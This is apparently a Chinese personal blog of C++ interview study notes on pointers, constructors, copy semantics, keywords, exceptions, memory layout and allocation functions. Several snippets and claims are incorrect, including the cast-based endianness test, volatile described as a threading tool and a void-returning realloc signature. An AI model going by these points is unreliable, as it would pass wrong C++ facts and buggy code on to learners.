<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 char a[] = &quot;hello world&quot;;</span><br><span class="line"> 2 char *p = a;</span><br><span class="line"> 3 </span><br><span class="line"> 4 //计算数组和指针的内存容量</span><br><span class="line"> 5 cout&lt;&lt; sizeof(a) &lt;&lt; endl; // 12 字节</span><br><span class="line"> 6 cout&lt;&lt; sizeof(p) &lt;&lt; endl; // 4 字节</span><br><span class="line"> 7 </span><br><span class="line"> 8 //数组作为函数参数传递</span><br><span class="line"> 9 void Func(char a[100])//数组退化成指针</span><br><span class="line">10 &#123;</span><br><span class="line">11     cout&lt;&lt; sizeof(a) &lt;&lt; endl; // 4 字节而不是100 字节</span><br><span class="line">12 &#125;</span><br></pre></td></tr></table></figure>



<h2 id="final和override关键字"><a href="#final和override关键字" class="headerlink" title="final和override关键字"></a>final和override关键字</h2><h3 id="override"><a href="#override" class="headerlink" title="override"></a>override</h3><p>父类中用了虚函数，子类对父类的虚函数进行重写</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:<span class="keyword">public</span> A&#123;</span><br><span class="line">	<span class="comment">//void foo()&#123;&#125;也是可以的</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> <span class="keyword">override</span></span>&#123;&#125;;<span class="comment">//加了override，如果函数名写错了，编译不通过</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><p>不希望某个类被继承 or 不希望某个虚函数被重写；可以添加该关键字，一旦添加该关键字的类被继承，或方法被重写，编译报错</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:<span class="keyword">public</span> Base</span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span> <span class="keyword">final</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">final</span>:A&#123;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">fool</span><span class="params">()</span></span>; <span class="comment">//error，A里已经final了</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:<span class="keyword">public</span> B&#123;<span class="comment">//error，B类final</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="拷贝初始化与直接初始化"><a href="#拷贝初始化与直接初始化" class="headerlink" title="拷贝初始化与直接初始化"></a>拷贝初始化与直接初始化</h2><p>用于类类型对象时：</p>
<blockquote>
<p>直接初始化：</p>
<p>直接调用与实参匹配的构造函数</p>
<p>拷贝初始化：</p>
<p>先使用指定构造函数创建一个临时对象，调用拷贝构造函数将临时对象拷贝到正在创建的对象</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接初始化</span><br><span class="line">  string str1(&quot;i am a string&quot;);</span><br><span class="line">  string str2(str1);</span><br><span class="line"></span><br><span class="line">  //拷贝初始化</span><br><span class="line">  string str3=&quot;I am a string&quot;;</span><br><span class="line">  string str4=str3;//相当于隐身调用拷贝构造函数，而不是复制运算符函数</span><br></pre></td></tr></table></figure>

<p>当然了，拷贝构造函数为private时，语句3,4编译时会报错</p>
<p>explict修饰构造函数时：如果构造函数存在隐式转化，也报错</p>
<h3 id="什么时候调用拷贝构造函数"><a href="#什么时候调用拷贝构造函数" class="headerlink" title="什么时候调用拷贝构造函数"></a>什么时候调用拷贝构造函数</h3><p>用类的一个实例化对象去初始化另一个对象的时候 </p>
<p>函数的参数是类的对象时（非引用传递） </p>
<p>函数的返回值是函数体内局部对象的类的对象时 ,此时虽然发生（Named return Value优化）NRV优化，但是由于返回方式是值传递，所以会在返回值的地方调用拷贝构造函数</p>
<h2 id="编译型与解释型语言区别"><a href="#编译型与解释型语言区别" class="headerlink" title="编译型与解释型语言区别"></a>编译型与解释型语言区别</h2><p>执行方面</p>
<blockquote>
<p>编译型语言，先用编译器将代码编译成可执行文件如.exe才能执行</p>
<p>即源程序-&gt;机器指令-&gt;机器运行</p>
<p>解释型，解释(翻译)一条执行一条</p>
</blockquote>
<p>跨平台性</p>
<blockquote>
<p>编译型依赖特定平台，不同操作系统下使用不同编译工具进行编译，编译出来的机器代码不同</p>
<p>解释型移植性好（jvm(java虚拟机)、python虚拟机的强大）</p>
</blockquote>
<p>性能</p>
<blockquote>
<p>编译型要好一点</p>
<p>解释型语言中间隔了个虚拟机的存在，运行速度慢了，要求的内存也比较高</p>
</blockquote>
<p>总之，编译型，运行快，所需内存小，但跨平台性差</p>
<p>​			解释型，跨平台性好，但运行慢，内存大</p>
<h2 id="初始化和赋值的区别"><a href="#初始化和赋值的区别" class="headerlink" title="初始化和赋值的区别"></a>初始化和赋值的区别</h2><p>初始化：创建对象时赋予一个初值，分为直接初始化、拷贝初始化</p>
<p>赋值：将对象的当前值擦掉，用新值代替</p>
<p>简单类型来说没区别</p>
<p>对于类和复杂类型的话</p>
<p>怎么区分嘞：对象创建的时候就是初始化，未创建对象而对象的值改变就是赋值</p>
<h2 id="extern-“C”的用法"><a href="#extern-“C”的用法" class="headerlink" title="extern “C”的用法"></a>extern “C”的用法</h2><p>为了在c++代码中正确调用c语言代码，在程序中加上 extern “C”，相当于按照C语言进行编译了</p>
<p>使用场景：你比如多人协同开发，有人c++，有人c</p>
<p>使用例子：<a href="https://blog.csdn.net/m0_58367586/article/details/123015442">https://blog.csdn.net/m0_58367586/article/details/123015442</a></p>
<h2 id="野指针与悬空指针"><a href="#野指针与悬空指针" class="headerlink" title="野指针与悬空指针"></a>野指针与悬空指针</h2><p>都是指向无效内存区域的</p>
<p>野指针：</p>
<p>野指针，指的是没有被初始化过的指针</p>
<p><code>比如int *p;</code>为了防止出错，可这样 <code>int* p=nullptr;</code></p>
<p>解决：要么初始化、要么置空</p>
<p>悬空指针：</p>
<p>最初指向的内存已经被释放了的指针，如下p和p2都是悬空指针</p>
<p>解决：释放操作后，及时置空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">int* p=nullptr;</span><br><span class="line">int* p2=new int;</span><br><span class="line"></span><br><span class="line">p=p2;</span><br><span class="line"></span><br><span class="line">delete p2;</span><br></pre></td></tr></table></figure>

<p>所以，c++引入了智能指针，避免悬空指针的产生</p>
<h2 id="C-类型安全"><a href="#C-类型安全" class="headerlink" title="C++类型安全"></a>C++类型安全</h2><h3 id="什么是类型安全？"><a href="#什么是类型安全？" class="headerlink" title="什么是类型安全？"></a>什么是类型安全？</h3><p>类型安全很大程度上等价于内存安全，类型安全的代码不会试图访问自己没被授权的区域。</p>
<h3 id="c-的类型安全"><a href="#c-的类型安全" class="headerlink" title="c++的类型安全"></a>c++的类型安全</h3><p>操作符new返回的指针类型严格与对象匹配，而不是void*</p>
<p>dynamic_cast比static_cast有更多具体的类型检查</p>
<p>const关键字(有类型、作用域)代替#define constants(简单的文本替换)</p>
<h2 id="c-的构造函数"><a href="#c-的构造函数" class="headerlink" title="c++的构造函数"></a>c++的构造函数</h2><p>默认构造函数（无参）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Student</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">	student()&#123;</span><br><span class="line">	this-&gt;id=1;</span><br><span class="line">	this-&gt;name=&quot;yuleiyun&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>初始化构造函数(有参数)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student(int a, string str):id(a), name(str)&#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>拷贝构造函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student(const student&amp; s)&#123;</span><br><span class="line"> this-&gt;id = s.id;</span><br><span class="line"> this-&gt;name = s.name;</span><br><span class="line"> &#125;; </span><br></pre></td></tr></table></figure>

<p>移动构造函数(move和右值引用)</p>
<p>委托构造函数</p>
<p>转换构造函数(形参只有一个，是其他类型变量)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">student(int id)&#123; //将其它类型变量，隐式转换为本类对象</span><br><span class="line"> this-&gt;id = id;</span><br><span class="line"> this-&gt;name = &quot;yuleiyun&quot;;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="浅拷贝与深拷贝-暂略"><a href="#浅拷贝与深拷贝-暂略" class="headerlink" title="浅拷贝与深拷贝(暂略)"></a>浅拷贝与深拷贝(暂略)</h2><p>当进行变量被赋值给另一变量的时候，这是在进行<strong>复制</strong></p>
<p>浅拷贝只是拷贝基本数据类型(非指针变量)，并没有新开辟一个地址，拷贝的指针和原来的指针指向同一块地址</p>
<p>如果对象中变量带有指针或引用，再释放浅拷贝的指针资源会出错</p>
<p>深拷贝不仅拷贝指针，还开辟出一块新的空间用来存放新的值。不会出现浅拷贝出错的情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">using namespace std;</span><br><span class="line">class Person&#123;</span><br><span class="line">private:</span><br><span class="line">    int num; </span><br><span class="line">    char* name;</span><br><span class="line">public:</span><br><span class="line">    Person()&#123;</span><br><span class="line">        name=new char(20);</span><br><span class="line">        cout&lt;&lt;&quot;Person&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    ~Person()&#123;</span><br><span class="line">        cout&lt;&lt;&quot;~Person &quot;&lt;&lt;&amp;name&lt;&lt;endl;</span><br><span class="line">        delete name;</span><br><span class="line">        name=NULL;</span><br><span class="line">    &#125;;</span><br><span class="line">    Person(const Person &amp;p)&#123;</span><br><span class="line">        //浅拷贝</span><br><span class="line">        name=p.name;</span><br><span class="line"></span><br><span class="line">        //深拷贝</span><br><span class="line">        // name=new char(20);</span><br><span class="line">        // memcpy(name,p.name,strlen(p.name));</span><br><span class="line">        cout&lt;&lt;&quot;Copy Person&quot;&lt;&lt;endl;</span><br><span class="line">    &#125;;</span><br><span class="line">    void getname()</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    &#123;</span><br><span class="line">        Person p1;</span><br><span class="line">     Person p2(p1);//复制</span><br><span class="line">    // p2.getname();</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我的浅拷贝没报错</p>
<h2 id="内联函数与宏定义"><a href="#内联函数与宏定义" class="headerlink" title="内联函数与宏定义"></a>内联函数与宏定义</h2><p>在使用时，宏只做简单字符串替换（编译前）；</p>
<p>而内联函数可以进行参数类型检查（编译时），且具有返回值</p>
<p>内联函数在编译时直接将函数代码嵌入到目标代码中，省去函数调用的开销来提高执行效率，并且进行参数类型检查，具有返回值，可以实现重载</p>
<p>宏定义时要注意书写（参数要括起来）否则容易出现歧义；</p>
<p>内联函数不会产生歧义，内联函数有类型检测、语法判断等功能，而宏没有</p>
<h3 id="内联函数使用场景"><a href="#内联函数使用场景" class="headerlink" title="内联函数使用场景"></a>内联函数使用场景</h3><p>使用宏定义的地方都可以inline函数</p>
<p>作为类成员接口函数来读写类的私有成员或保护成员，提高效率</p>
<h2 id="大小端存储"><a href="#大小端存储" class="headerlink" title="大小端存储"></a>大小端存储</h2><p>大端：字数据的高字节存储在低地址</p>
<p>小端：字数据的低字节存储在低地址</p>
<p>在socket编程中，往往将操作系统使用的小端存储的IP地址转化为大端存储，从而进行网络传输</p>
<p>例如32字节的0x12345678（高字节-&gt;低字节）</p>
<p>小端存储方式：</p>
<table>
<thead>
<tr>
<th>内存地址</th>
<th>0x2000</th>
<th>0x2001</th>
<th>0x2002</th>
<th>0x2003</th>
</tr>
</thead>
<tbody><tr>
<td>内存内容</td>
<td>0x78</td>
<td>0x56</td>
<td>0x34</td>
<td>0x12</td>
</tr>
</tbody></table>
<p>大端存储方式：</p>
<table>
<thead>
<tr>
<th>内存地址</th>
<th>0x2000</th>
<th>0x2001</th>
<th>0x2002</th>
<th>0x2003</th>
</tr>
</thead>
<tbody><tr>
<td>内存内容</td>
<td>0x12</td>
<td>0x34</td>
<td>0x56</td>
<td>0x78</td>
</tr>
</tbody></table>
<h3 id="代码判断"><a href="#代码判断" class="headerlink" title="代码判断"></a>代码判断</h3><h4 id="1-强制类型转换"><a href="#1-强制类型转换" class="headerlink" title="1.强制类型转换"></a>1.强制类型转换</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a=0x1234;//int 与 char的长度不同，int转换成char，只会留下低字节部分</span><br><span class="line">char c=(char)(a);</span><br><span class="line">if(c==0x12)</span><br><span class="line">cout&lt;&lt;&quot;大端&quot;&lt;&lt;endl;</span><br><span class="line">else if(c==0x34)</span><br><span class="line">cout&lt;&lt;&quot;小端&quot;&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

<h4 id="2-巧用union联合体"><a href="#2-巧用union联合体" class="headerlink" title="2.巧用union联合体"></a>2.巧用union联合体</h4><h2 id="volatile、mutable和explicit关键字的用法"><a href="#volatile、mutable和explicit关键字的用法" class="headerlink" title="volatile、mutable和explicit关键字的用法"></a>volatile、mutable和explicit关键字的用法</h2><h3 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h3><p>volatile定义变量的值是易变的，每次用到这个变量的值的时候都要去重新读取这个变量的值，而不是读寄存器内的备份。多线程中被几个任务共享的变量需要定义为volatile类型。</p>
<p>多线程下：有些变量是用volatile关键字声明的。当两个线程都要用到某一个变量且该变量的值会被改变时，应该用 volatile声明，该关键字的作用是防止优化编译器把变量从内存装入CPU寄存器中。</p>
<h3 id="mutable"><a href="#mutable" class="headerlink" title="mutable"></a>mutable</h3><p>mutable:可变的、易变的，在C++中，mutable 也是为了突破const的限制而设置的。被mutable修饰的变量，将永远处于可变的状态，即使在一个const 函数中。我们知道，如果类的成员函数不会改变对象的状态，那么这个成员函数一般会声明成const的。 但是，有些时候，我们需要在const函数里面修改一些跟类状态无关的数据成员，那么这个函数就应该被 mutable来修饰，并且放在函数后后面关键字位置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">int m_A;</span><br><span class="line">mutable int m_B;//特殊变量 在常函数里值也可以被修改</span><br><span class="line">public:</span><br><span class="line"> void add() const//在函数里不可修改this指针指向的值 常量指针</span><br><span class="line"> &#123;</span><br><span class="line"> m_A=10;//错误 不可修改值，this已经被修饰为常量指针</span><br><span class="line"> m_B=20;//正确</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">class person</span><br><span class="line">&#123;</span><br><span class="line">int m_A;</span><br><span class="line">mutable int m_B;//特殊变量 在常函数里值也可以被修改</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">const person p;//修饰常对象 不可修改类成员的值</span><br><span class="line">p.m_A=10;//错误，被修饰了指针常量</span><br><span class="line">p.m_B=200;//正确，特殊变量，修饰了mutable</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h3><p>explicit关键字用来修饰类的<strong>构造函数</strong>，被修饰的构造函数的类，不能发生相应的隐式类型转换，<strong>只能以显示的方式进行类型转换</strong>，注意以下几点： </p>
<p>explicit 关键字只能用于类内部的构造函数声明上 </p>
<p>explicit 关键字作用于单个参数的构造函数 </p>
<p>被explicit修饰的构造函数的类，不能发生相应的隐式类型转换</p>
<h2 id="c-的异常处理方法"><a href="#c-的异常处理方法" class="headerlink" title="c++的异常处理方法"></a>c++的异常处理方法</h2><p>常见异常：</p>
<blockquote>
<p>数组下标越界</p>
<p>除数为0</p>
<p>动态分配空间不足</p>
<p>…</p>
</blockquote>
<h3 id="1-try、throw、catch关键字"><a href="#1-try、throw、catch关键字" class="headerlink" title="1.try、throw、catch关键字"></a>1.try、throw、catch关键字</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    double m,n;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    try&#123;</span><br><span class="line">        cout&lt;&lt;&quot;before dividing: &quot;&lt;&lt;endl;</span><br><span class="line">        if(n==0) throw -1;//抛出int型异常</span><br><span class="line">        else if(m==0) throw -1.0;//抛出double型异常</span><br><span class="line">        else cout&lt;&lt;m/n&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;&quot;after dividing. &quot;&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    catch(double d)&#123;</span><br><span class="line">        cout&lt;&lt;&quot;catch (double) &quot;&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    catch(int c)&#123;</span><br><span class="line">        cout&lt;&lt;&quot;catch (int) &quot;&lt;&lt;c&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;&quot;finished. &quot;&lt;&lt;endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输入m&#x3D;1，n&#x3D;0</p>
<blockquote>
<p>before dividing:<br>catch (int) -1<br>finished.</p>
</blockquote>
<p>输入m&#x3D;0,n&#x3D;1</p>
<blockquote>
<p>before dividing:<br>catch (double) -1<br>finished.</p>
</blockquote>
<p>输入 m&#x3D;4,n&#x3D;2;</p>
<blockquote>
<p>before dividing:<br>2<br>after dividing.<br>finished.</p>
</blockquote>
<p>程序的执行流程是：</p>
<p>先执行try包裹的语句块：</p>
<p>​		如果执行过程中没有异常发生，则不会进入任何catch包裹的语句块</p>
<p>如果发生异常， 则使用throw进行异常抛出，再由catch进行捕获，throw可以抛出各种数据类型的信息</p>
<p>代码中使用的是数字，也可以自定义异常class</p>
<p>catch根据throw抛出的数据类型进行精确捕获（不会出现类型转换）， 如果匹配不到就直接报错，可以使用catch(…)的方式捕获任何异常（不推荐）</p>
<p>当然，如果catch了异常，当前函数如果不进行处理，或者已经处理了想通知上一层的调用者，可以在catch里面再throw异常。</p>
<h3 id="2-函数的异常声明列表"><a href="#2-函数的异常声明列表" class="headerlink" title="2.函数的异常声明列表"></a>2.函数的异常声明列表</h3><p><code>int fun() throw(int,double,A,B,C)&#123;...&#125;;</code></p>
<h3 id="3-c-标准异常类exception"><a href="#3-c-标准异常类exception" class="headerlink" title="3.c++标准异常类exception"></a>3.c++标准异常类exception</h3><p>bad_typeid：使用typeid运算符，如果其操作数是一个多态类的指针，而该指针的值为 NULL，则会拋 出此异常</p>
<p>bad_cast：在用 dynamic_cast 进行从多态基类对象（或引用）到派生类的引用的强制类型转换时，如 果转换是不安全的，则会拋出此异常 </p>
<p>bad_alloc：在用 new 运算符进行动态内存分配时，如果没有足够的内存，则会引发此异常</p>
<p> out_of_range:用 vector 或 string的at 成员函数根据下标访问元素时，如果下标越界，则会拋出此异常</p>
<h2 id="形参、实参区别"><a href="#形参、实参区别" class="headerlink" title="形参、实参区别"></a>形参、实参区别</h2><ul>
<li>形参变量只有在被调用时才分配内存单元，在调用结束时， 即刻释放所分配的内存单元</li>
<li>实参是一个确定的值(常量、函数、变量、表达式)，获取输入也好、预先赋值也好使实参获得确认值，产生临时变量</li>
<li>它们在个数、类型上、顺序上严格匹配，否则调用函数出错</li>
<li>函数调用中数据单向传递，实参-&gt;形参；所以形参的值变化，不影响实参</li>
<li>当形参、实参不是指针类型：<ul>
<li>在该函数运行时，形参和实参是不同的变量，他们在内存中位于不同的位置</li>
<li>形参将实参的内容复制一份，在该函数运行结束的时候形参被释放，而实参内容不会改变</li>
</ul>
</li>
</ul>
<h2 id="值传递、指针传递、引用传递的区别和效率"><a href="#值传递、指针传递、引用传递的区别和效率" class="headerlink" title="值传递、指针传递、引用传递的区别和效率"></a>值传递、指针传递、引用传递的区别和效率</h2><h3 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h3><p>形参向函数所属的栈拷贝数据的过程，如果值传递的对象是类对象，耗费一定的时间和空间</p>
<h3 id="指针传递"><a href="#指针传递" class="headerlink" title="指针传递"></a>指针传递</h3><p>传地址值，同样有一个形参向函数所属栈拷贝数据的过程，但拷贝数据固定为4字节的地址</p>
<h3 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h3><p>同样有上述拷贝过程，但是针对地址的，为该数据所在地址起了一个别名</p>
<h2 id="静态变量什么时候初始化"><a href="#静态变量什么时候初始化" class="headerlink" title="静态变量什么时候初始化"></a>静态变量什么时候初始化</h2><h2 id="const关键字作用"><a href="#const关键字作用" class="headerlink" title="const关键字作用"></a>const关键字作用</h2><ul>
<li>防止变量改变，防止指针更改指向</li>
<li>修饰形参，在函数内部不能修改</li>
<li>对于类的成员函数，const修饰表示常函数，不能修改类的成员变量；类的常对象只能访问类的常成员函数</li>
<li>对于类的成员函数，必须指定其返回值为const类型，使得其返回值不为左值</li>
<li>const成员函数可以访问 非const对象的非const或const数据成员、const对象内的所有数据成员</li>
<li>非const成员函数不能访问const对象的任意数据成员</li>
<li>引用或指针传递函数调用时，因为函数内部可以改变引用或指针所指向的变量，用const修饰形参才是实在地保护了实参所指向变量</li>
</ul>
<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><p>子类或派生类</p>
<p>特点为：</p>
<p>子类拥有父类所有属性和方法</p>
<p>子类可以拥有父类没有的属性和方法</p>
<p>子类对象可以当做父类对象使用</p>
<h2 id="c-编译过程"><a href="#c-编译过程" class="headerlink" title="c++编译过程"></a>c++编译过程</h2><p>预处理-&gt;编译-&gt;汇编-&gt;链接</p>
<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理，对伪指令(以#开头的指令，如：宏定义、条件编译(#if #endif)、头文件)和特殊符号（注释、三元符）处理</p>
<p>预处理指令包括(#include、#define、#pragma)</p>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译器，对上步的文件词法分析、语法分析、语义分析，生成汇编代码文件</p>
<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编器，将汇编代码转化为机器可执行的二进制代码(机器码)，并生成目标文件</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>链接器，解决多个文件之间符号引用问题；</p>
<p>因为编译时，编译器只对单个文件进行处理，如果该文件需要引用到其他文件中的符号的话，比如全局变量或调用某个库函数中的函数，需要由链接器把所有的目标文件链接到一起才能确定最终地址，生成最终可执行文件</p>
<p><img src="/../../../Typora/img111/image-20230810125208966.png"></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="c-内存的5个区"><a href="#c-内存的5个区" class="headerlink" title="c++内存的5个区"></a>c++内存的5个区</h2><p>1、栈：内存由编译器在<strong>需要时自动分配和释放</strong>。通常用来存储局部变量和函数参数。（为运行函数而分配的局部变量、函数参数、返回地址等存放在栈区）。</p>
<p>栈运算分配内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p>
<p>2、堆：内存使用<strong>new进行分配，使用delete或delete[]释放</strong>。如果未能对内存进行正确的释放，会造成内存泄漏。但在程序结束时，会由操作系统自动回收。</p>
<p>3、 代码区：存放程序的二进制代码</p>
<p>4、全局&#x2F;静态存储区：全局变量和静态变量被分配到同一块内存中，C语言中区分初始化和未初始化的，C++中不再区分了。（全局变量、静态数据、常量存放在全局数据区），使用静态关键字static声明，在静态存储区申请一个静态变量</p>
<p>5、 常量存储区：存储常量，不允许被修改。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int* p=new int[5];</span><br></pre></td></tr></table></figure>

<p>看到new，说明分配了一块堆内存；而指针p嘞，分配的是一块栈内存；</p>
<p>该语句是：在栈内存中存放了一个指向一块堆内存的指针p，调用operator new 分配内存，然后返回这块内存的首地址，放入栈中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int a = 0; //全局初始化区</span><br><span class="line">char *p1; //全局未初始化区</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int b; //栈</span><br><span class="line">    char s[] = &quot;abc&quot;; //栈</span><br><span class="line">    char *p2; //栈</span><br><span class="line">    char *p3 = &quot;123456&quot;; //123456\0在常量区，p3在栈上。</span><br><span class="line">    static int c = 0; //全局（静态）初始化区</span><br><span class="line">    p1 = (char *)malloc(10);</span><br><span class="line">    p2 = (char *)malloc(20);</span><br><span class="line">    //分配得来得10和20字节的区域就在堆区。</span><br><span class="line">    strcpy(p1, &quot;123456&quot;); //123456\0放在常量区，编译器可能会将它与p3所指向的&quot;123456&quot;优化成一个地方。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="c-没有垃圾回收机制"><a href="#c-没有垃圾回收机制" class="headerlink" title="c++没有垃圾回收机制"></a>c++没有垃圾回收机制</h2><p>首先，实现一个垃圾回收器会带来额外的空间和时间开销。你需要开辟一定的空间保存指针的引用计 数和对他们进行标记mark。然后需要单独开辟一个线程在空闲的时候进行free操作。 垃圾回收会使得C++不适合进行很多底层的操作。</p>
<h2 id="malloc、realloc、calloc"><a href="#malloc、realloc、calloc" class="headerlink" title="malloc、realloc、calloc"></a>malloc、realloc、calloc</h2><ol>
<li><p>malloc函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void* malloc(unsigned int num_size);</span><br><span class="line">int *p = malloc(20*sizeof(int));申请20个int类型的空间；</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>calloc函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void* calloc(size_t n,size_t size);</span><br><span class="line">int *p = calloc(20, sizeof(int));</span><br></pre></td></tr></table></figure>

<p>省去了人为空间计算；malloc申请的空间的值是随机初始化的，calloc申请的空间的值是初始化为0的；</p>
</li>
<li><p>realloc函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void realloc(void *p, size_t new_size)</span><br></pre></td></tr></table></figure>

<p>给动态分配的空间分配额外的空间，用于扩充容量。</p>
</li>
</ol>
<h2 id="类成员初始化方式？构造函数的执行顺序-？为什么用成员初始化列表-会快一些？"><a href="#类成员初始化方式？构造函数的执行顺序-？为什么用成员初始化列表-会快一些？" class="headerlink" title="类成员初始化方式？构造函数的执行顺序 ？为什么用成员初始化列表 会快一些？"></a>类成员初始化方式？构造函数的执行顺序 ？为什么用成员初始化列表 会快一些？</h2><ol>
<li><p>赋值初始化，通过在函数体内进行赋值初始化；</p>
</li>
<li><p>列表初始化，在冒号后使用初始化列表进行初始化。 </p>
<p>这两种方式的主要区别在于：</p>
<p> 对于在<strong>函数体中初始化</strong>，是在所有的<strong>数据成员被分配内存空间后</strong>才进行的；</p>
<p><code>相当于一次默认构造+一次赋值</code></p>
<p> <strong>列表初始化是</strong>给数据成员<strong>分配内存空间时</strong>就进行初始化，就是说分配一个数据成员只要冒号后有此数据成员的赋值表达式(此表达式必须是括号赋值表达式),那么分配了内存空间后在进入函数体之前给数据成员赋值，就是说初始化这个数据成员此时函数体还未执行。</p>
<p><code>相当于一次赋值操作</code></p>
<p><code>其相比赋值初始化而言，少了调用构造函数的过程</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class test&#123;</span><br><span class="line">private:</span><br><span class="line">	string val;</span><br><span class="line">	test* tep;</span><br><span class="line">	</span><br><span class="line">public:</span><br><span class="line">	test()//赋值初始化</span><br><span class="line">	&#123;</span><br><span class="line">	this.val=&quot;yuleiyun&quot;;</span><br><span class="line">	this-&gt;tep=nullptr;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	test(string s):val(s),tep(nullptr)&#123;&#125;//列表初始化</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>一个派生类构造函数的执行顺序如下：</p>
<p> ① 虚拟基类的构造函数（多个虚拟基类则按照继承的顺序执行构造函数）</p>
<p> ② 基类的构造函数（多个普通基类也按照继承的顺序执行构造函数）</p>
<p> ③ 类类型的成员对象的构造函数（按照初始化顺序）</p>
<p> ④ 派生类自己的构造函数。</p>
</li>
</ol>
<p>方法一是在构造函数当中做赋值的操作，</p>
<p>而方法二是做纯粹的初始化操作</p>
<p>我们都知道，C++的赋值操作是会产生临时对象的。临时对象的出现会降低程序的效率。</p>
<h2 id="string与c的char"><a href="#string与c的char" class="headerlink" title="string与c的char*"></a>string与c的char*</h2><p>string是对char*的封装，string包含了char*数组的属性</p>
<p>string可以进行动态扩展</p>
